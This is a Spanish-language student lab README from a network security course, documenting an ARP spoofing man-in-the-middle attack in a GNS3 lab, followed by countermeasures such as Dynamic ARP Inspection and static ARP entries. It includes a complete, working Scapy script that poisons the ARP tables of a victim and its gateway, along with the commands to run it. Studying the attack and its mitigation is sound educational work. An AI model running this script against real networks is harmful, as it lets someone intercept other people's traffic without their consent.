# 🕵️ ARP Spoofing — Script de Ataque Automatizado MitM

<div align="center">

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)

**Lab. Networking — Ataques MitM y Mitigación de Capa 2**

| Campo | Detalle |
|---|---|
| **Alumno** | Wilfri Solano Frias |
| **Matrícula** | 2024-2364 |
| **Asignatura** | Seguridad de Redes |

[📹 Video Demostrativo](https://www.youtube.com/watch?v=vMMKubAXT8Y&list=PLGfNWxn7Di3BhsEEifmTJKXP4_U9fla7P&index=6)

</div>

---

## ⚠️ Advertencia Legal

> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Funcionamiento del Ataque](#funcionamiento-del-ataque)
- [Topología de Red](#topología-de-red)
- [Requisitos](#requisitos)
- [Parámetros Configurables](#parámetros-configurables)
- [Uso](#uso)
- [Código del Script](#código-del-script)
- [Explicación Técnica](#explicación-técnica)
- [Evidencias](#evidencias)
- [Contramedidas](#contramedidas)
- [Referencias](#referencias)

---

## 📋 Descripción

Este script automatiza el ataque de **ARP Spoofing**, explotando la ausencia de autenticación en el protocolo de resolución de direcciones (ARP). El atacante inunda la red periódicamente con respuestas ARP fraudulentas (*Gratuitous/Unicast ARP Replies*), corrompiendo las tablas ARP tanto de la víctima como del Gateway, y asociando su propia MAC con ambas IPs para interceptar todo el tráfico bidireccional.

### ¿Cómo funciona el ataque?

```
[Atacante - Kali Linux]  →  Envía ARP Reply falsa a la Víctima:
                             "La IP del Gateway (.1) está en MI MAC"
        ↓
[Víctima - Windows 10]  →  Actualiza su tabla ARP con datos falsos
        ↓
[Atacante - Kali Linux]  →  Envía ARP Reply falsa al Gateway:
                             "La IP de la Víctima (.133) está en MI MAC"
        ↓
[Gateway - Router Cisco]  →  Actualiza su tabla ARP con datos falsos
        ↓
    Ciclo se repite cada 2 segundos (más rápido que las
    actualizaciones legítimas del sistema operativo)
        ↓
[Switch SWI2]  →  Redirige el tráfico de la víctima hacia el atacante
        ↓
[Resultado]  →  Atacante se convierte en MITM
                Intercepta todo el tráfico hacia y desde la víctima
```

> ⚠️ **Paso previo obligatorio:** Activar IP Forwarding en Kali antes de ejecutar el script:
> `sudo sysctl -w net.ipv4.ip_forward=1`
> Sin este paso, el ataque bloquea el tráfico de la víctima convirtiéndose en un DoS.

---

## 🧱 Topología de Red

```
                    ┌─────────────┐
                    │   ROUTER    │
                    │  (Gateway)  │
                    │192.168.124.1│
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SWI2     │ ← Switch Cisco IOU L2
                    │  (Switch)   │
                    └──┬──────┬───┘
                 e0/1 ║      ║ e0/2
                      ║      ║
               ┌──────┴──┐  ┌┴──────────┐
               │  Kali   │  │ Windows10 │
               │ Linux   │  │  (Víctima)│
               │.135     │  │.133       │
               └─────────┘  └───────────┘
```

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
|---|---|---|---|---|---|
| Router Cisco | e0/0 | 192.168.124.1 | /24 | VLAN 1 | Gateway de la red |
| SWI2 | e0/0, e0/1, e0/2 | N/A | N/A | Troncal | Switch bajo prueba |
| **Kali Linux** | **eth0** | **192.168.124.135** | **/24** | **VLAN 1** | **Equipo atacante** |
| **Windows 10** | **eth0** | **192.168.124.133** | **/24** | **VLAN 1** | **Víctima** |

---

## ⚙️ Requisitos

| Categoría | Requisito | Versión |
|---|---|---|
| Sistema Operativo | Kali Linux | 2024.x o superior |
| Lenguaje | Python | 3.10 o superior |
| Librería principal | Scapy | 2.5.0 o superior |
| Módulos Scapy | ARP, send, getmacbyip | Incluidos |
| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
| Privilegios | root / sudo | Obligatorio |
| Kernel (IP Forward) | net.ipv4.ip_forward=1 | Obligatorio para MitM real |

### Instalación de Dependencias

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Scapy
pip install scapy

# Activar reenvío de paquetes (obligatorio antes de ejecutar)
sudo sysctl -w net.ipv4.ip_forward=1

# Verificar instalación
python3 -c "from scapy.all import *; print('Scapy listo')"
```

---

## 🔧 Parámetros Configurables

| Variable | Tipo | Valor por Defecto | Descripción |
|---|---|---|---|
| `IP_VICTIMA` | `str` | `192.168.124.133` | Dirección IP del host víctima |
| `IP_GATEWAY` | `str` | `192.168.124.1` | Dirección IP del gateway de la red |
| `INTERVALO` | `int` | `2` | Segundos entre cada ciclo de re-envenenamiento |

---

## 🚀 Uso

```bash
# Clonar el repositorio
git clone https://github.com/wilfrisf-sudo/ARP-SPOOFING
cd ARP-SPOOFING

# Paso 1: Activar IP Forwarding (evita convertir el ataque en DoS)
sudo sysctl -w net.ipv4.ip_forward=1

# Paso 2: Ejecutar con privilegios de root (obligatorio)
sudo python3 Ataque_ARP_Spoofing.py
```

### Salida esperada

```
[*] Iniciando ataque ARP Spoofing (MitM)...
[*] Víctima: 192.168.124.133 | Gateway: 192.168.124.1

[*] Paquetes ARP enviados: 124
[-] Ataque detenido. Restaurando tablas ARP...
[+] Tablas ARP restauradas correctamente.
```

---

## 📝 Código del Script

```python
#!/usr/bin/env python3
from scapy.all import ARP, send, getmacbyip
import time
import os

IP_VICTIMA = "192.168.124.133"
IP_GATEWAY = "192.168.124.1"
INTERVALO  = 2

def spoof(ip_destino, ip_suplantar):
    """Envía una ARP Reply falsa asociando la MAC del atacante con la IP objetivo"""
    mac_destino = getmacbyip(ip_destino)
    paquete = ARP(
        op     = 2,
        pdst   = ip_destino,
        hwdst  = mac_destino,
        psrc   = ip_suplantar
    )
    send(paquete, verbose=False)

def restaurar(ip_destino, ip_origen):
    """Restaura el mapeo ARP legítimo al finalizar el ataque"""
    mac_destino = getmacbyip(ip_destino)
    mac_origen  = getmacbyip(ip_origen)
    paquete = ARP(
        op     = 2,
        pdst   = ip_destino,
        hwdst  = mac_destino,
        psrc   = ip_origen,
        hwsrc  = mac_origen
    )
    send(paquete, count=4, verbose=False)

def ataque_arp_spoofing():
    """Función principal: envenena las tablas ARP de forma bidireccional"""
    print("[*] Iniciando ataque ARP Spoofing (MitM)...")
    print(f"[*] Víctima: {IP_VICTIMA} | Gateway: {IP_GATEWAY}\n")

    contador = 0
    try:
        while True:
            spoof(IP_VICTIMA, IP_GATEWAY)   # Víctima cree que el Gateway es el atacante
            spoof(IP_GATEWAY, IP_VICTIMA)   # Gateway cree que la Víctima es el atacante
            contador += 2
            print(f"\r[*] Paquetes ARP enviados: {contador}", end="")
            time.sleep(INTERVALO)
    except KeyboardInterrupt:
        print("\n\n[-] Ataque detenido. Restaurando tablas ARP...")
        restaurar(IP_VICTIMA, IP_GATEWAY)
        restaurar(IP_GATEWAY, IP_VICTIMA)
        print("[+] Tablas ARP restauradas correctamente.")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_ARP_Spoofing.py")
        exit(1)

    ataque_arp_spoofing()
```

---

## 🔍 Explicación Técnica del Funcionamiento

| # | Función / Bloque | Descripción Técnica |
|---|---|---|
| 1 | **Importaciones** | Carga `scapy.all` y `time` para inyección ARP y temporización |
| 2 | **`spoof()`** | Genera y envía una ARP Reply falsa hacia el destino indicado |
| 3 | **`getmacbyip()`** | Envía un ARP Request automático para obtener la MAC real del destino |
| 4 | **`op=2`** | Fuerza el paquete como ARP Reply (respuesta), no como solicitud |
| 5 | **`psrc`** | IP que se desea suplantar ante el destino (gateway o víctima) |
| 6 | **`restaurar()`** | Reenvía el mapeo ARP legítimo para evitar disrupciones al finalizar |
| 7 | **`ataque_arp_spoofing()`** | Bucle infinito de envenenamiento bidireccional cada 2 segundos |
| 8 | **`time.sleep(2)`** | Intervalo más rápido que las actualizaciones ARP del sistema operativo |
| 9 | **`send()`** | Inyección de paquetes ARP a nivel L3 sin necesidad de socket raw |
| 10 | **`verificacion_root()`** | Valida permisos de administrador antes de ejecutar |

---

## 📸 Evidencias del Ataque

### Evidencia 1 — Topología en GNS3

<img width="587" height="433" alt="imagen" src="https://github.com/user-attachments/assets/783fedf4-396e-44c1-a041-98414aaebb0e" />

*Diseño de la topología virtualizada con Router, Switch y hosts*

### Evidencia 2 — Tabla ARP Dinámica (Antes del Ataque)

<img width="493" height="177" alt="imagen" src="https://github.com/user-attachments/assets/18d27430-3475-44d7-ad3f-5e69039589f3" />

*Mapeo ARP legítimo de la víctima Windows 10 antes de ejecutar el script*

### Evidencia 3 — Ejecución del Script

<img width="829" height="205" alt="imagen" src="https://github.com/user-attachments/assets/c4124d5f-5cd1-4749-92e1-1813e9713f68" />

*Script enviando ARP Replies fraudulentas de forma continua en Kali Linux*

### Evidencia 4 — Impacto del Ataque (Tabla ARP Envenenada)

<img width="514" height="192" alt="imagen" src="https://github.com/user-attachments/assets/54d7a4c4-3596-4ca9-a96e-498a968b70c9" />

*Tabla ARP de la víctima comprometida: la IP del Gateway apunta a la MAC del atacante*

### Evidencia 5 — Aplicación de Contramedidas

<img width="505" height="100" alt="imagen" src="https://github.com/user-attachments/assets/13a1e9f7-e68d-4855-8b8f-13d27fd39941" />

<img width="847" height="36" alt="imagen" src="https://github.com/user-attachments/assets/1a53dce1-22c6-447e-ae59-e405c2c17d94" />

<img width="483" height="182" alt="imagen" src="https://github.com/user-attachments/assets/39f578d5-d860-40e1-8201-ab3e95cba079" />

*Entradas ARP estáticas configuradas en Windows 10 y Router Cisco*

---

## 🛡️ Contramedidas y Mitigación

### Dynamic ARP Inspection — DAI (Mitigación en el Switch)

DAI intercepta y valida todas las respuestas ARP contra la base de datos de DHCP Snooping, descartando las fraudulentas.

> **Nota Técnica de Laboratorio:** La imagen virtual Cisco IOU L2 (`i86bi-linux-l2-ipbasek9`) utilizada en GNS3 no soporta DAI. La mitigación se aplicó de forma estática directamente en los extremos.

### Mitigación Estática en los Extremos

**A. Configuración en la Víctima (Windows 10):**

```cmd
netsh interface ipv4 add neighbors "Ethernet" "192.168.124.1" "aa-bb-cc-00-01-00"
```

**B. Configuración en el Gateway (Router Cisco):**

```ios
Router# configure terminal
Router(config)# arp 192.168.124.133 000c.294f.b6be arpa
```

### Tabla de Contramedidas

| Medida | Descripción | Impacto |
|---|---|---|
| `Dynamic ARP Inspection` | Valida respuestas ARP contra DHCP Snooping | **Bloquea el ataque** |
| ARP estático en Windows | Fija el mapeo IP-MAC del gateway en el extremo | Inmuniza la víctima |
| ARP estático en Router | Fija el mapeo IP-MAC de la víctima en el gateway | Protege el tráfico entrante |
| DHCP Snooping (base) | Crea la tabla de vinculaciones para DAI | Requisito para DAI |

---

## 📚 Referencias

- [Cisco — Dynamic ARP Inspection](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst6500/ios/12-2SX/configuration/guide/book/dynarp.html)
- [Scapy Documentation — ARP](https://scapy.readthedocs.io/)
- [GNS3 Documentation](https://docs.gns3.com/)

---

<div align="center">

**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**

*Laboratorio desarrollado con fines exclusivamente educativos*

</div>
